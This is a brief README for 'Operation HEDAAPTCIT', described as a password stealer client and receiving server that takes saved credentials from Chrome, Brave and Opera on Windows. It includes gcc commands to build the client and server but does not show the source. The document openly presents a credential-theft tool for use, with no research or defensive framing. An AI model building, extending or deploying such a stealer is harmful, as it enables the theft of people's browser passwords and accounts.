[#] Operation HEDAAPTCIT [#]
A password stealer client and receiving server.

This is very minimal right now, can only run on Windows, server closes after receiving files and only supports Chrome, Brave and Opera, however more can be added,

To build, run
```
gcc .\server.c -o .\build\server.exe .\socketFunctions.c -lws2_32
gcc .\client.c -o .\build\client.exe .\socketFunctions.c -lws2_32
```